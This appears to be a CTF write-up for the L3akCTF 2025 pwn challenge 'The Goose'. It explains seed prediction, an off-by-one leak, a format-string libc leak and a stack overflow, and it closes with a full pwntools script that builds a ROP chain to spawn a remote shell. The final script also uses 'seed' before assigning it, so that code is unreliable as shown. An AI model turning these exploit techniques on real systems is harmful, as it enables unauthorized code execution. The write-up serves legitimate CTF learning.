---
layout: post
title: "L3akCTF 2025 - pwn / The Goose(en)"
date: 2025-07-15 04:54:07 +0900
categories: writeups
tags: [CTF, pwn, format string, buffer overflow, rand]
---
# 🧵 TL;DR

This is a goose-honking guessing game 🪿🪿\
You can either leak the result of `rand()` or synchronize the seed to predict how many times the goose will honk.

Once that's cleared:

- Leak a libc address via a format string bug
- Trigger a buffer overflow in `read()`
- Build a ROP chain and execute `system("/bin/sh")` to grab the flag 🔥


# 🪿 About the Challenge

**📝 Description:**

> When the honking gets tough, you better brush up on your basics.

**📂 Provided files:**

- `chall` : the executable binary
- `Dockerfile` : environment setup

**🔄 Game flow:**

1. Input your name
2. Guess how many times the goose honks
   - If correct ✅ → continue
   - If wrong ❌ → game over
3. Input your name again
4. Input your victory message
<br>
![実行ファイルイメージ](/assets/images/1.png)
<br><br>

**🎯 Objective:**\
Interact with the remote `chall` service and read the contents of `/srv/flag.txt` 🔥


# 🐛 Vulnerabilities Overview

---

## 1-a. Predictable Seed

The program uses `rand()` seeded with the system time.\
If we sync our local time to the remote server's, we can predict the honk count exactly.\
[OWASP: Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)

---

## 1-b. Misalignment in Input Size

Here's a sneaky one — `username` is a 63-byte array, but `scanf("%64s", ...)` reads up to 64 bytes.\
That means the null terminator (`\x00`) might not be placed after `username`, allowing it to leak into the adjacent `nhonks` variable!

```c
char username[63];  
scanf("%64s", &username);
```

### Example: 63 bytes of 'a'

```c
0x555555558080 <username>:      0x6161616161616161      0x6161616161616161
0x555555558090 <username+16>:   0x6161616161616161      0x6161616161616161
0x5555555580a0 <username+32>:   0x6161616161616161      0x6161616161616161
0x5555555580b0 <username+48>:   0x6161616161616161      0x0061616161616161
0x5555555580c0 <nhonks>:        0x0000000000000040      0x0000000000000000

$ x/s 0x555555558080
0x555555558080 <username>:      'a' <repeats 63 times>
```

### Example: 64 bytes of 'a'

Since there's no NUL between username and nhonks, accessing username ends up reading through to @(0x40) 😱

```c
0x555555558080 <username>:      0x6161616161616161      0x6161616161616161
0x555555558090 <username+16>:   0x6161616161616161      0x6161616161616161
0x5555555580a0 <username+32>:   0x6161616161616161      0x6161616161616161
0x5555555580b0 <username+48>:   0x6161616161616161      0x6161616161616161
0x5555555580c0 <nhonks>:        0x0000000000000040      0x0000000000000000

$ x/s 0x555555558080
0x555555558080 <username>:      'a' <repeats 64 times>, "@"
```

---

## 2-a. Format String Vulnerability

The program uses `printf(local_f8);` without any format string.\
Classic case: it allows stack reads (and sometimes writes!) via `%p`, `%n`, etc.\
[OWASP: Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)

---

## 3-a. Buffer Overflow

The program calls `read(0, buf, 0x400);` on a small stack buffer.\
That means we can overwrite up to and including the return address — perfect for a ROP chain.

Sample stack layout:

```c
0x7ffcbf15aae0: 0x0000000000000000      0x0000000000000000
0x7ffcbf15aaf0: 0x0000000000000000      0x0000000000000000
0x7ffcbf15ab00: 0x0000000000000002      0x8000000000000006
...
0x7ffcbf15ac30: 0x656c206f7420656b      0x74206f7420657661
0x7ffcbf15ac40: 0x646c726f77206568      0x000000470000003f
0x7ffcbf15ac50: 0x00007ffcbf15ac70      0x00005dd83e3a8481　← return address can be overwritten 🔥
```
<br>

# ⚔️ Let's Exploit!

## 1. Initial Recon

I used Ghidra to inspect the control flow, check for randomness handling and input functions. Here's what I found:

<br><br>
![ghidra1](/assets/images/2.png)
<br><br>
![ghidra2](/assets/images/3.png)
<br><br>
![ghidra2](/assets/images/6.png)
<br><br>

I also checked linked libraries and binary protections using `ldd` and `checksec`:

```sh
$ ldd chall
    linux-vdso.so.1 (0x00007ffe90b29000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000071b1f5a8c000)
    /lib64/ld-linux-x86-64.so.2 (0x000071b1f5c8b000)

$ checksec chall
[*] '/home/xxxx/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

## 2. Attack Plan

1. **Honk count prediction**\
   There were two possible approaches.  
   1-a: reproduce the random numbers using the same seed.  
   1-b: leak the random numbers directly.  
   However, since I didn't notice option 1-b during the CTF, I went with the method of reproducing the random numbers.

2. **Flag access**\
   No direct function exposed the flag, so we’ll build a ROP chain to call `system("/bin/sh")`.

3. **Leak libc address**\
   Use the format string vulnerability to leak a libc address (e.g. `__libc_start_main`).

4. **Get exact libc file**\
   To calculate offsets, I pulled the remote libc from the Docker container. There might be smarter ways to do this, but this worked for me 🫠

## 3. Honk Count Syncing

```python
seed = int(time.time())
# Adjust seed for time lag if needed (e.g. seed += 1)
local_libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
local_libc.srand(seed)  
HONK_cnt = local_libc.rand() % 0x5b + 10 # Matches the server logic
```

## 4. Getting the Remote libc

```sh
$ docker build -t goose .
$ docker run --name goose -itd goose /bin/sh
$ docker cp goose:/srv/lib/x86_64-linux-gnu/libc.so.6 ./
```

## 5. ROP Chain Construction

We want to run `system("/bin/sh")` so we need:

- `ret` (for stack alignment)
- `pop rdi; ret`
- address of `"/bin/sh"`
- address of `system`

## 6. Resolving Offsets

```python
#remote
libc_file = "/home/xxxx/goose/libc.so.6"
#local
#libc_file = "/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_file, checksec=False)
rop = ROP(libc)
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret']).address
ret_offset = rop.find_gadget(['ret']).address
```

## 7. Exploit Script

```python
#!/usr/bin/python3
from pwn import *
from Crypto.Util.number import *
from Crypto.Random import *
import ctypes
import time
import re

#program & connect infomation
file = "./chall"
binary = ELF(file, checksec=False)
context.binary= file
#context.log_level = 'debug'
server= 'XX.XX.XX.XX'
port = 9999


#case:remote
session = remote(server,port)
seed += 2                                 # account for the time lag +2
libc_file = "/home/xxxx/goose/libc.so.6"  # get the libc file from docker machine 

#case:local
#session = process(file)
#libc_file = "/lib/x86_64-linux-gnu/libc.so.6"

#startline
print("---------------------------------------------------------------")

#seed
seed = int(time.time())
local_libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
local_libc.srand(seed)
HONK_cnt = local_libc.rand() % 0x5b + 10
print(f"honk_num:{HONK_cnt},time={seed}")
print("---------------------------------------------------------------")

#1st:conversation
wait_messages = b"> "
session.recvuntil(wait_messages)
payload = b"any"
session.sendline(payload)

#2nd:HONKS count guessing
wait_messages = b"how many honks?"
session.recvuntil(wait_messages)
payload = str(HONK_cnt).encode()
session.sendline(payload)

#receive all
res=b""
while True:
    try:
        chunk = session.recv(timeout=0.5)
        if not chunk:
            break
        res += chunk
    except EOFError:
        break

print(f"HONK_messages:{res.decode()}")
print("---------------------------------------------------------------")

#judge
keyword = b"what's your name again?"
if res.find(keyword) == -1:
    print("HONKS count is incorrect :( Please retry...")
    exit()
else:
    print("HONKS count is correct! :D")

print("---------------------------------------------------------------")

#3rd: leak the libc address
payload = b"%57$p"  # from saved rip
session.sendline(payload)
res = session.recv().decode()
addresses = re.findall(r"0x[0-9a-fA-F]+", res)             #leak address : libc_start_call_main +122
libc_start_main_addr = int(addresses[0], 16) - 122 + 0xb0  #__libc_start_main = libc_start_call_main + 0xb0  


#gadget calculation
libc = ELF(libc_file, checksec=False)
rop = ROP(libc)
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret']).address
ret_offset = rop.find_gadget(['ret']).address

libc_base_addr = libc_start_main_addr - libc_start_main_offset
system_addr = libc_base_addr + system_offset
binsh_addr = libc_base_addr + binsh_offset
pop_rdi_ret = libc_base_addr + pop_rdi_ret_offset 
ret = libc_base_addr + ret_offset

print(f"libc_base_addr:{hex(libc_base_addr)}")
print(f"system_addr:{hex(system_addr)}")
print(f"binsh_addr:{hex(binsh_addr)}")
print(f"pop_rdi_ret:{hex(pop_rdi_ret)}")
print(f"ret:{hex(ret)}")

print("---------------------------------------------------------------")

#4th:ROP chain
payload = b"A" * 376
payload += p64(ret) # aalignment adjustment
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
session.sendline(payload)
session.interactive()
```

---

# 💭 Final Thoughts

This challenge was like a medley of pwn basics — and honestly, it was a fun! \
I still feel a bit shaky on the libc side of things, and my solver script turned out a bit long...\
But overall I learned a lot and had fun — looking forward to growing more from here 😆

